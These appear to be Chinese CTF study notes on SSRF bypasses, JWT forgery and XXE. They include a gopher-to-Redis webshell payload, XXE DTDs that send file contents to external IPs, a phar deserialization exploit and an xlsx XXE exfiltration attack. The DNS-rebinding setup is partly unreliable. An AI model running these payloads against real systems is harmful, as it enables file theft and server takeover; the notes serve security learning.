@@ -1,0 +1,861 @@
+SSRF 
+Server-side Request Forgery 服务端请求伪造
+攻击向服务端发送包含恶意url连接的请求，借由服务端发起请求
+以便获取服务端网络内部的资源
+一句话总结：
+控制服务端使用指定协议访问指定的url
+A：你为什么这么干？
+B：是谁谁谁让我干的
+A：谁谁谁让你去吃shi你去不去？
+特点：
+1 让别人访问我们访问不到的url
+2 拿到自己本来拿不到的数据
+
+
+条件：
+1 别人能帮我访问url 服务端有接受url地址并进行访问的功能
+2 url地址外部可控
+https://xxx.com/index.php?url=http://www.baidu.com
+
+
+<?php
+$url = $_GET['url'];
+header('location:'.$url); //302的跳转
+?>
+
+是不是属于ssrf?
+
+告诉浏览器，你去访问这个地址 
+此时，浏览器，是客户端还是服务端
+
+客户端   
+
+此时，服务器没有访问这个Url,只是告诉你浏览器，去跳转到这个地址去
+是浏览器去访问，不是服务端去访问
+所以，不是SSRF
+只能算 任意跳转漏
+分清  是否是ssrf
+url地址可控
+http://10.xx.xx.xx/
+file:///etc/passwd
+URL格式
+URI = scheme:[//authority]path[?query][#fragment]
+schema: 协议头
+://
+authority 
+[userinfo@]host[:port]
+
+默认使用80端口，而80端口默认情况下，是可以省略
+http://www.baidu.com/robots.txt
+
+本质，就是 通过指定的协议，访问互联网上某台服务器的某个资源或者某个文件
+默认使用匿名账户访问
+userinfo: username:password@hos
+schema://username:password@host:port/path?a=b#top
+http://ctfshow:hacker@www.baidu.com/robots.txt
+
+
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+$url=$_POST['url'];
+//初始化一个cURL会话
+$ch=curl_init($url);
+//设定返回信息中包含响应信息头
+curl_setopt($ch, CURLOPT_HEADER, 0);
+//启用时会将头文件的信息作为数据流输出。 
+//参数为1表示输出信息头,为0表示不输出
+ 
+//设定curl_exec()函数将响应结果返回，而不是直接输出
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+//参数为1表示$result,为0表示echo $result
+ 
+//执行一个cURL会话
+$result=curl_exec($ch);
+//关闭一个curl会话
+curl_close($ch);
+//输出返回信息  如果CURLOPT_RETURNTRANSFER参数为fasle可省略
+echo ($result);
+?>
+
+
+SSRF的利用面
+http://127.0.0.1:8000/fgc.php?url=file:///var/www/html/flag.php
+http://127.0.0.1:8000/fgc.php?url=http://127.0.0.1/flag.php
+1 任意文件读取 前提是知道要读取的文件名
+2 探测内网资源
+ 127.0.0.1 mysql服务端监听了127.0.0.1这个地址，也就表示，只能通过127.0.0.1这个IP来访问
+ 0.0.0.0 表示允许任意ip访问
+ 192.168.233.233 只允许特定的IP地址访问
+ 3 使用gopher协议扩展我们的攻击面
+ apache/nginx 80
+ tomcat 8080
+ node 3000
+ flask 8080
+ php-fpm 9000
+ mysql 3306
+ ftp 21
+ ssh 22
+ redis 6379
+ key-value  gopher://127.0.0.1:6379/_save_/var/www/html/1.php_<?php eval($_POST[1]);?>
+ mysql 3306
+ 用户密码为空 
+ php-fpm
+ php-fpm 默认监听9000端口，而且只允许本机127.0.0.1这个地址访问
+ 主要负责对.php文件的代码解释执行  
+ 我们可以通过向9000端口发送格式的请求，来让9000端口背后的php-fpm帮我们处理我们提交的php代码
+ 通过向9000端口发送php执行请求
+ 设置php.ini中的运行参数
+ 其中使用 auto_append_file 来指定 php://input 包含恶意代码，然后执行
+ 为了能使用auto_append_file参数，必须有一个存在的php文件来使用这个配置项
+ php原生类进行ssrf
+$soap =new SoapClient($_GET['url']);
+$soap->hack();
+//$soap->__call()
+url可控，可以发送内网请求
+ssrf绕过
+只要不允许它访问本地地址即可，也就是说，过滤的目的是，不让访问127.0.0.1地址
+1 enclosed alphanumerics 绕过
+127.0.0.1
+127.⓿.⓿.1
+2 使用IP地址转换
+所有的域名->IP  
+ip可以使用不同进制来表示 
+127.0.0.1用不同进制可以表示为
+- 2130706433  10进制 http://2130706433  
+- 017700000001 8进制 http://017700000001 
+- 7F000001 16进制   http://0x7F000001 
+3 特殊语法绕过
+Windows 下 0 代表的是0.0.0.0 
+而Linux 下 0 代表的是127.0.0.1
+127.0.0.1 可以省略为 127.1
+127。0。0。1 可以替代127.0.0.1
+4 如果对方可以接受302跳转，并且跟进302跳转
+可以发送http的协议。但是返回的location为其他协议
+http://xxx.com/302.php?schema=gopher&host=127.0.0.1&port=9000&payload=xxxx
+(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP
+(2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证
+(3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。
+(4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。
+
+
+compress.zlib://data:@baidu.com/baidu.com,phpinfo()
+`compress.zlib`绕过data协议的检测，`@`使`data:`被解释为用户名和密码，`baidu.com/baidu.com`中只要包含`/`就会被解释为合法的`media-type`
+
+1·修改自己域名的a记录，改成127.0.0.1
+2·这个网站a记录指向127.0.0.1 可以直接利用
+url=http://sudo.cc/flag.php
+1. 设置阿里云 DNS 解析
+首先，您需要一个在阿里云上注册的域名，并且您需要能够管理该域名的 DNS 记录。
+
+创建域名和设置 DNS 解析
+登录到 阿里云控制台。
+在左侧菜单中选择“域名与网站” > “域名”，并选择您的域名。
+点击“解析”，进入 DNS 解析设置页面。
+添加 A 记录：
+主机记录：@
+记录类型：A
+解析线路：默认
+记录值：203.0.113.1（第一次返回的外部 IP）
+TTL：1分钟
+注意：阿里云 DNS 不支持将 TTL 设置为 0，但您可以将其设置为最小值，例如 1 分钟。
+
+2. 配置可控的 DNS 服务器
+由于阿里云 DNS 不支持 TTL 为 0 的设置，您需要配置一个您可以完全控制的 DNS 服务器。您可以在阿里云 ECS 实例上运行一个 DNS 服务器（例如 Bind 或 dnsmasq），并手动设置 TTL 为 0。
+
+使用 dnsmasq 设置 DNS 服务器
+在阿里云上创建一个 ECS 实例并安装 dnsmasq：
+
+bash
+复制代码
+sudo yum install -y dnsmasq  # 对于 CentOS
+sudo apt-get install -y dnsmasq  # 对于 Ubuntu
+编辑 dnsmasq 配置文件 /etc/dnsmasq.conf，添加如下内容：
+
+conf
+复制代码
+no-resolv
+server=8.8.8.8  # 使用 Google 的公共 DNS 作为上游 DNS 服务器
+address=/sudo.cc/203.0.113.1  # 初始解析返回外部 IP
+address=/sudo.cc/127.0.0.1  # 重绑定解析返回内网 IP
+注意：确保 TTL 设置为 0。dnsmasq 的默认 TTL 是 0，不需要额外配置。
+
+启动 dnsmasq 服务：
+
+bash
+复制代码
+sudo systemctl restart dnsmasq
+sudo systemctl enable dnsmasq
+更新您在阿里云上的域名解析，指向您配置的 ECS 实例的 IP 地址。
+
+3. 执行 DNS Rebinding 攻击
+在攻击者机器上启动 netcat 监听：
+
+bash
+复制代码
+nc -lvnp 4444
+发送 POST 请求到目标服务器：
+
+bash
+复制代码
+curl -X POST -d "url=http://sudo.cc/flag.php" http://目标服务器地址/script.php
+验证和调试
+验证 DNS 解析：
+确保在目标服务器上进行 DNS 解析时，能够返回正确的 IP 地址：
+
+bash
+复制代码
+nslookup sudo.cc
+检查防火墙和安全组：
+确保您的阿里云 ECS 实例的安全组规则允许外部访问。
+
+监控 DNS 解析：
+使用 tcpdump 或其他网络监控工具，确保 DNS 请求和响应符合预期。
+
+注意事项
+合法性：确保您进行的所有操作都是在合法授权的范围内。未经授权的攻击是非法的。
+测试环境：最好在隔离的测试环境中进行测试，以避免对生产环境造成影响。
+防护措施：了解并学习这些攻击技术后，建议采取相应的防护措施，防止在实际应用中被利用。
+
+5 利用短网址绕过
+baidu.com  不允许出现baidu
+或者限制了url长度，我们可以切换为短网址，来绕过长度的限制
+http://rurl.vip/eW7AU
+
+首先准备监听
+url=http://ctf.@127.0.0.1/flag.php?show
+url=http://ctf.@127.0.0.1/flag.php#show
+
+本地才能看到flag，这就需要ssrf了
+==========================================================================================================================================================
+
+JWT
+
+jwt是一个轻量级的认证规范 对数据进行签名用的
+
+防止数据被篡改
+1 对数据进行加密   内容对用户敏感，不需要对外
+2 对数据进行签名   内容不敏感，但是确保不被篡改
+
+JWT是对数据进行签名，防止数据篡改，而不是防止数据被读取
+JSON Web Token JWT 
+?username=admin&score=100  别人传递过程中，会对积分进行篡改 
+?username=admin&score=100&token=c17961f5f372f8cf039113909d715943
+? md5(score=100&username=admin)=c17961f5f372f8cf039113909d715943
+?score=100&username=admin&token=c17961ff372f8cf039113909d715943
+篡改数据的同时，破解了算法，篡改了签名
+加盐机制，salt
+md5(score=100&username=admin_ctfshow)=20f3fa445b286df3f1a518fcbcd8bbe2
+
+盐值有可能被爆破，也有可能被泄露
+增加更高的密码算法，不再简单的md5，盐值也大幅度提高长度，达到几百上千位 来保证我们的数据不被篡改  或者即使篡改了我们能发现
+由 Header、Payload、Signature三部分构成，用点分隔，数据采用Base64URL进行编码
+Header是JWT的第一个部分，是一个 JSON 对象，主要声明了JWT的签名算法，如“HS256”、“RS256”等，以及其他可选参数，如“kid”等。
+Header
+
+{
+    "alg" : "HS256",
+    "typ" : "jwt"
+}
+Payload是JWT的第二个部分，这也是一个 JSON 对象，主要承载了各种声明并传递明文数据，一般用于存储用户的信息，如 id、用户名、角色、令牌生成时间和其他自定义声明
+Payload
+{
+    "user" : "Admin"
+}
+Signature
+    Signature 是对 Header 和 Payload 进行签名，具体是用什么加密方式写在 Header的alg中。同时拥有该部分的JWT被称为JWS，也就是签了名的JWT。
+    Signature的功能是保护token完整性。
+生成方法为将header和payload两个部分联结起来，然后通过header部分指定的算法，计算出签名。抽象成公式就是：signature = HMAC-SHA256(base64urlEncode(header) + '.' + base64urlEncode(payload), secret_key)
+值得注意的是，编码header和payload时使用的编码方式为base64urlencode，base64url编码是base64的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充"="号，并将标准Base64中的"+"和"/"分别改成了"-"和"_"。
+
+JWT生成-在线网址&工具
+python3 flask_session_cookie_manager3.py encode -s 'secret_key' -t '{"admin":True,"username":"admin"}'
+
+
+漏洞点
+
+1 当不校验算法时，我们可以替换算法，甚至可以使用空的算法，来达到数据篡改目的
+{
+    "alg" : "None",
+    "typ" : "jwt"
+}
+{
+    "user" : "Admin"
+}
+{"alg":"None","typ":"JWT"}
+{"iss":"admin","iat":1673703091,"exp":1673710291,"nbf":1673703091,"sub":"admin","jti":"21a3d6eec9efbc030983fbc3650c0f03"}
+
+ewogICAgImFsZyIgOiAiTm9uZSIsCiAgICAidHlwIiA6ICJqd3QiCn0=.ewogICAgInVzZXIiIDogImFkbWluIgp9
+
+
+JWT 爆破工具地址
+https://github.com/brendan-rius/c-jwt-cracker
+docker build . -t jwtcrack
+docker run -it --rm  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE
+
+密钥混淆攻击
+    JWT最常用的两种算法是HMAC和RSA。HMAC用同一个密钥对token进行签名和认证。而RSA需要两个密钥，先用私钥加密生成JWT，然后使用其对应的公钥来解密验证。那么，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。由于公钥有时可以被攻击者获取到，所以攻击者可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名。
+     利用方式：jwt_tool(https://github.com/ticarpi/jwt_tool)
+     用法：python3 jwt_tool.py token_here -pk pubkey -T -S hs256
+密钥爆破/泄露
+    HMAC签名密钥（例如HS256 / HS384 / HS512）使用对称加密，这意味着对令牌进行签名的密钥也用于对其进行验证。由于签名验证是一个自包含的过程，因此可以测试令牌本身的有效密钥，而不必将其发送回应用程序进行验证。
+    因此，jwtcrack破解是JWT破解工具，可以通过穷举的方式暴力破解密钥。
+    如果可以破解HMAC密钥，则可以伪造令牌中的任何内容，这个漏洞将会给系统带来非常严重的后果，所以在加密时不要使用弱密钥进行加密。
+    jwtcrack(https://github.com/brendan-rius/c-jwt-cracker)
+    用法：./jwtcrack token_here
+
+node安装jwt命令
+
+npm install jsonwebtoken
+
+1 私钥泄露
+
+可以根据私钥生成任意的jwt字符串
+
+
+const jwt = require('jsonwebtoken');
+const fs = require('fs');
+
+var privateKey = fs.readFileSync('private.key');
+
+var token = jwt.sign({ user: 'admin' }, privateKey, { algorithm: 'RS256' });
+console.log(token)
+验签
+
+
+2 公钥泄露
+
+可以根据公钥，修改算法从非对称算法 到 对称密钥算法  
+
+双方都使用公钥验签，顺利篡改数据
+
+当公钥可以拿到时，如果使用对称密码，则对面使用相同的公钥进行解密
+
+实现验签通过
+
+
+总结加密方式
+
+1 非对称加密算法  私钥  公钥   只要两个时匹配 一个私钥加密的文件，用公钥都能解开(验签)
+
+
+2 对称加密算法   暗号  口令  公钥 
+
+总结jwt攻击
+
+1 空密码算法绕过 不验证算法的前提下
+
+2 弱密码绕过   猜测弱密码
+
+3 密码爆破   安装docker 执行jwtcracker
+
+4 私钥泄露  直接利用私钥生成正确jwt字符串 过验签
+
+5 公钥泄露  不验证算法前提下，修改算法为对称加密，通过公钥重新生成对称签名的字符串 实现验签通过
+
+===================================================================================================================================================================================
+
+xxe的利用
+受到影响的类和函数
+`SimpleXMLElement`、`DOMDocument`、`simplexml_load_string`
+(libxml<2.9.0, PHP 5, PHP 7)
+libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。为了演示PHP环境下的XXE漏洞
+XML Entity 实体注入
+当程序处理xml文件时，没有禁止对外部实体的处理，容易造成xxe漏洞
+危害
+主流是任意文件读取
+
+error_reporting(0);
+libxml_disable_entity_loader(false);	//默认情况下，libxml_disable_entity_loader 是启用的，它禁用外部实体的加载。这里，它被设置为 false，意味着允许外部实体的加载。这可能带来安全风险，因为它可能允许 XXE (XML External Entity) 攻击
+$xmlfile = file_get_contents('php://input');
+if(isset($xmlfile)){
+    $dom = new DOMDocument();
+    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);//LIBXML_NOENT 会将实体替换为它们的值，而 LIBXML_DTDLOAD 会加载外部 DTD。
+    $creds = simplexml_import_dom($dom);
+    $ctfshow = $creds->ctfshow; //从 SimpleXMLElement 对象中提取名为 "ctfshow" 的元素。
+    echo $ctfshow;
+}
+highlight_file(__FILE__);
+
+
+
+XML 文件
+一般表示带有结构的数据
+祖父  3个叔父  8个堂弟堂妹   
+
+<祖父>
+
+    <叔父1>
+        <堂兄1>
+    </叔父1>
+
+    <叔父2>
+     <堂兄2>    
+    </叔父2>
+
+    <叔父3>
+
+     <堂兄3>
+    </叔父4>
+
+</祖父>
+
+<!DOCTYPE> 声明定义了整个文档的类型，<!ENTITY> 声明定义了一个实体。
+xml格式
+1 有回显时文件读取方法
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE hacker[
+    <!ENTITY hacker SYSTEM "file:///flag">
+]> 
+
+<root>
+    <ctfshow>
+        &hacker;
+    </ctfshow>
+</root>
+
+php://filter/read=convert.base64-encode/resource=/flag
+2 无回显时文件读取方法
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE hacker [
+    <!ENTITY % myurl SYSTEM "http://47.236.120.83/test.dtd">
+    %myurl;
+]>
+<root>
+1
+</root>
+
+
+
+test.dtd内容
+
+<!ENTITY % dtd "<!ENTITY &#x25; vps SYSTEM 'http://43.154.107.226:3389/%file;'> ">
+%dtd;
+%vps;
+
+
+报错xxe
+- libxml<=2.8(2.9以后默认不使用外部实体)
+- 开启了报错
+- 无回显
+<?xml version="1.0" ?>
+<!DOCTYPE message [
+	<!ENTITY % file SYSTEM "file:///etc/passwd">
+	<!ENTITY % a '
+		<!ENTITY &#x25; b "
+			<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;
+			>
+		">
+	'>
+%a;
+%b;
+]>
+<message>asfddasfd</message>
+或
+<?xml version="1.0" ?>
+<!DOCTYPE message [
+    <!ENTITY % condition '
+        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+'>
+    %condition;
+]>
+<message>any text</message>
+
+
+
+### xxePhar
+
+弱口令`admin/admin`登录，会跳转到一个文件上传的点。可以先使用`XXE`逐一读取`doLogin.php`和`class.php`的文件内容
+
+
+```php
+#doLogin.php
+<?php
+/**
+* autor: c0ny1
+* date: 2018-2-7
+*/
+include("class.php");
+$USERNAME = 'admin'; //账号
+$PASSWORD = 'admin'; //密码
+$result = null;
+
+libxml_disable_entity_loader(false);
+$xmlfile = file_get_contents('php://input');
+
+try{
+	$dom = new DOMDocument();
+	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+	$creds = simplexml_import_dom($dom);
+
+	$username = $creds->username;
+	$password = $creds->password;
+
+	if($username == $USERNAME && $password == $PASSWORD){
+		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",1,$username);
+	}else{
+		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",0,$username);
+	}	
+}catch(Exception $e){
+	$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",3,$e->getMessage());
+}
+
+header('Content-Type: text/html; charset=utf-8');
+echo $result;
+?>
+
+#class.php
+<?php
+class Fun{
+    private $func = 'call_user_func_array';
+    public function __call($f,$p){
+        call_user_func($this->func,$f,$p);
+    }
+}
+
+class Test{
+    public function __call($f,$p){
+        echo getenv("FLAG");
+    }
+    public function __wakeup(){
+        echo "serialize me?";
+    }
+}
+
+class A {
+    public $a;
+    public function __get($p){
+        if(preg_match("/Test/",get_class($this->a))){
+            return "No test in Prod\n";
+        }
+        return $this->a->$p();
+    }
+}
+
+class B {
+    public $p;
+    public function __destruct(){
+        $p = $this->p;
+        echo $this->a->$p;
+    }
+}
+?>
+
+```
+
+
+
+构造序列化内容，exp如下
+
+```php
+<?php
+class Fun{
+    private $func;
+
+    public function __construct(){
+        $this->func = array(new Test,"__call");
+    }
+}
+
+class Test{
+}
+
+class A {
+    public $a;
+
+    public function __construct($a){
+        $this->a = $a;
+    }
+}
+
+class B {
+    public $p = "aaa";
+}
+
+$a = new B();
+$b = new A(new Fun());
+$a->a = $b;
+
+@unlink("phar.phar");
+$phar = new Phar("phar.phar");
+$phar->startBuffering();
+$phar->setStub("<?php __HALT_COMPILER(); ?>");
+$phar->setMetadata($a);
+$phar->addFromString("test.txt", "test");
+$phar->stopBuffering();
+?>
+```
+将生成的phar文件上传
+
+最后利用XXE通过phar协议触发反序列化获得flag。 SYSTEM phar:///temp/phar.phat
+
+
+
+
+
+
+### 网鼎杯 FileJava
+
+可以上传任意文件和下载文件，但是不能访问，所以不能用一句话连接，在下载文件功能发现可以下载任意文件，于是将WEB-INF/web.xml页面下载,访问`/file_in_java/DownloadServlet?filename=../../../../WEB-INF/web.xml`,相关内容如下
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
+         version="4.0">
+    <servlet>
+        <servlet-name>DownloadServlet</servlet-name>
+        <servlet-class>cn.abc.servlet.DownloadServlet</servlet-class>
+    </servlet>
+
+    <servlet-mapping>
+        <servlet-name>DownloadServlet</servlet-name>
+        <url-pattern>/DownloadServlet</url-pattern>
+    </servlet-mapping>
+
+    <servlet>
+        <servlet-name>ListFileServlet</servlet-name>
+        <servlet-class>cn.abc.servlet.ListFileServlet</servlet-class>
+    </servlet>
+
+    <servlet-mapping>
+        <servlet-name>ListFileServlet</servlet-name>
+        <url-pattern>/ListFileServlet</url-pattern>
+    </servlet-mapping>
+
+    <servlet>
+        <servlet-name>UploadServlet</servlet-name>
+        <servlet-class>cn.abc.servlet.UploadServlet</servlet-class>
+    </servlet>
+
+    <servlet-mapping>
+        <servlet-name>UploadServlet</servlet-name>
+        <url-pattern>/UploadServlet</url-pattern>
+    </servlet-mapping>
+</web-app>
+```
+
+发现有上传和下载的配置文件，由2个类组成，将这2个类进行下载。分别访问`/file_in_java/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/DownloadServlet.class`、`/file_in_java/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/UploadServlet.class`。使用`jd-gui.exe`分别进行反编译，其中`DownloadServlet.class`源码如下：
+
+```java
+package cn.abc.servlet;
+
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.io.PrintStream;
+import java.net.URLEncoder;
+import javax.servlet.RequestDispatcher;
+import javax.servlet.ServletContext;
+import javax.servlet.ServletException;
+import javax.servlet.ServletOutputStream;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+
+public class DownloadServlet extends HttpServlet
+{
+  private static final long serialVersionUID = 1L;
+
+  protected void doGet(HttpServletRequest request, HttpServletResponse response)
+    throws ServletException, IOException
+  {
+    doPost(request, response); }
+
+  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+    String fileName = request.getParameter("filename");
+    fileName = new String(fileName.getBytes("ISO8859-1"), "UTF-8");
+    System.out.println("filename=" + fileName);
+    if ((fileName != null) && (fileName.toLowerCase().contains("flag"))) {
+      request.setAttribute("message", "禁止读取");
+      request.getRequestDispatcher("/message.jsp").forward(request, response);
+      return;
+    }
+    String fileSaveRootPath = getServletContext().getRealPath("/WEB-INF/upload");
+    String path = findFileSavePathByFileName(fileName, fileSaveRootPath);
+    File file = new File(path + "/" + fileName);
+    if (!(file.exists())) {
+      request.setAttribute("message", "您要下载的资源已被删除!");
+      request.getRequestDispatcher("/message.jsp").forward(request, response);
+      return;
+    }
+    String realname = fileName.substring(fileName.indexOf("_") + 1);
+    response.setHeader("content-disposition", "attachment;filename=" + URLEncoder.encode(realname, "UTF-8"));
+    FileInputStream in = new FileInputStream(path + "/" + fileName);
+    ServletOutputStream out = response.getOutputStream();
+    byte[] buffer = new byte[1024];
+    int len = 0;
+    while ((len = in.read(buffer)) > 0)
+      out.write(buffer, 0, len);
+    in.close();
+    out.close();
+  }
+
+  public String findFileSavePathByFileName(String filename, String saveRootPath) {
+    int hashCode = filename.hashCode();
+    int dir1 = hashCode & 0xF;
+    int dir2 = (hashCode & 0xF0) >> 4;
+    String dir = saveRootPath + "/" + dir1 + "/" + dir2;
+    File file = new File(dir);
+    if (!(file.exists()))
+      file.mkdirs();
+    return dir;
+  }
+}
+```
+
+`UploadServlet.class`源码如下:
+
+```java
+package cn.abc.servlet;
+
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.PrintStream;
+import java.util.Iterator;
+import java.util.List;
+import java.util.UUID;
+import javax.servlet.RequestDispatcher;
+import javax.servlet.ServletContext;
+import javax.servlet.ServletException;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import org.apache.commons.fileupload.FileItem;
+import org.apache.commons.fileupload.FileUploadException;
+import org.apache.commons.fileupload.disk.DiskFileItemFactory;
+import org.apache.commons.fileupload.servlet.ServletFileUpload;
+import org.apache.poi.openxml4j.exceptions.InvalidFormatException;
+import org.apache.poi.ss.usermodel.Sheet;
+import org.apache.poi.ss.usermodel.Workbook;
+import org.apache.poi.ss.usermodel.WorkbookFactory;
+
+public class UploadServlet extends HttpServlet
+{
+  private static final long serialVersionUID = 1L;
+
+  protected void doGet(HttpServletRequest request, HttpServletResponse response)
+    throws ServletException, IOException
+  {
+    doPost(request, response); }
+
+  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+    String savePath = getServletContext().getRealPath("/WEB-INF/upload");
+    String tempPath = getServletContext().getRealPath("/WEB-INF/temp");
+    File tempFile = new File(tempPath);
+    if (!(tempFile.exists()))
+      tempFile.mkdir();
+    String message = "";
+    try {
+      DiskFileItemFactory factory = new DiskFileItemFactory();
+      factory.setSizeThreshold(102400);
+      factory.setRepository(tempFile);
+      ServletFileUpload upload = new ServletFileUpload(factory);
+
+      upload.setHeaderEncoding("UTF-8");
+      upload.setFileSizeMax(1048576L);
+      upload.setSizeMax(10485760L);
+      if (!(ServletFileUpload.isMultipartContent(request)))
+        return;
+      List list = upload.parseRequest(request);
+      Iterator localIterator = list.iterator();
+      while (true) { FileItem fileItem;
+        String filename;
+        while (true) { do { String str;
+            while (true) { if (!(localIterator.hasNext())) break label438; fileItem = (FileItem)localIterator.next();
+              if (!(fileItem.isFormField())) break;
+              String name = fileItem.getFieldName();
+              str = fileItem.getString("UTF-8");
+            }
+
+            filename = fileItem.getName(); }
+          while (filename == null); if (!(filename.trim().equals(""))) break;
+        }
+        String fileExtName = filename.substring(filename.lastIndexOf(".") + 1);
+        InputStream in = fileItem.getInputStream();
+        if ((filename.startsWith("excel-")) && ("xlsx".equals(fileExtName)))
+          try {
+            Workbook wb1 = WorkbookFactory.create(in);
+            Sheet sheet = wb1.getSheetAt(0);
+            System.out.println(sheet.getFirstRowNum());
+          } catch (InvalidFormatException e) {
+            System.err.println("poi-ooxml-3.10 has something wrong");
+            e.printStackTrace();
+          }
+        String saveFilename = makeFileName(filename);
+        request.setAttribute("saveFilename", saveFilename);
+        request.setAttribute("filename", filename);
+        String realSavePath = makePath(saveFilename, savePath);
+        FileOutputStream out = new FileOutputStream(realSavePath + "/" + saveFilename);
+        byte[] buffer = new byte[1024];
+        int len = 0;
+        while ((len = in.read(buffer)) > 0)
+          out.write(buffer, 0, len);
+        in.close();
+        out.close();
+        label438: message = "文件上传成功!";
+      }
+    } catch (FileUploadException e) {
+      e.printStackTrace();
+    }
+    request.setAttribute("message", message);
+    request.getRequestDispatcher("/ListFileServlet").forward(request, response); }
+
+  private String makeFileName(String filename) {
+    return UUID.randomUUID().toString() + "_" + filename; }
+
+  private String makePath(String filename, String savePath) {
+    int hashCode = filename.hashCode();
+    int dir1 = hashCode & 0xF;
+    int dir2 = (hashCode & 0xF0) >> 4;
+    String dir = savePath + "/" + dir1 + "/" + dir2;
+    File file = new File(dir);
+    if (!(file.exists()))
+      file.mkdirs();
+    return dir;
+  }
+}
+```
+
+从`UploadServlet.class`可以关注到如下关键代码：
+
+```java
+if ((filename.startsWith("excel-")) && ("xlsx".equals(fileExtName)))
+          try {
+            Workbook wb1 = WorkbookFactory.create(in);
+            Sheet sheet = wb1.getSheetAt(0);
+            System.out.println(sheet.getFirstRowNum());
+          } catch (InvalidFormatException e) {
+            System.err.println("poi-ooxml-3.10 has something wrong");
+            e.printStackTrace();
+          }
+```
+
+其中`Apache POI XML外部实体攻击()`相关对应漏洞版本为`poi-ooxml-3.10-FINAL.jar及以下版本`，并且也是针对`Office`的攻击，于是可以进行尝试。创建名为`excel-1.xlsx`的文件，修改后缀为`zip`,使用`winrar`进行解压，修改`[Content-Types].xml`文件，在第2行添加
+
+```xml
+<!DOCTYPE convert [ 
+<!ENTITY % remote SYSTEM "http://ip:8001/file.dtd">
+%remote;%int;%send;
+]>
+```
+
+然后将文件重新压缩，并改后缀为`xlsx`
+
+接着使用`python3`起一个HTTP服务`python -m http.server 8001`开启HTTP服务，并放置`file.dtd`文件
+
+```dtd
+<!ENTITY % file SYSTEM "file:///flag">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://ip:8989?p=%file;'>">
+%int;
+%send;
+```
+
+开启监听，上传xlsx文件
